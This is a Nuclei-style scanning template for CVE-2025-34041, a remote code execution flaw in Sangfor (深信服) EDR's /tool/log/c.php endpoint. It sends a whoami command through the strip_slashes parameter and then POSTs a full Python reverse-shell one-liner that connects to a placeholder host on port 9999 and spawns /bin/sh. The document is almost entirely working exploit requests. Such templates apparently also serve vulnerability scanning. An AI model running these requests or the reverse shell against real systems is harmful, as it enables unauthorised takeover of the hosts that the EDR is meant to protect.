id: cve-2025-34041

info:
  name: 深信服 EDR Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template checks for remote code execution vulnerability in 深信服 EDR as described in CVE-2025-34041.
    It exploits the 'strip_slashes' parameter to execute arbitrary system commands.
  tags: rce, edr, cve-2025-34041

http:
  - raw:
      - |
        GET /tool/log/c.php?strip_slashes=system&limit=whoami HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /tool/log/c.php HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Content-Type: application/x-www-form-urlencoded;charset=utf-8
        Accept-Language: zh-CN,zh;q=0.9
        Content-Length: 256

        strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "uid="
          - "gid="
        part: body
      - type: status
        status:
          - 200
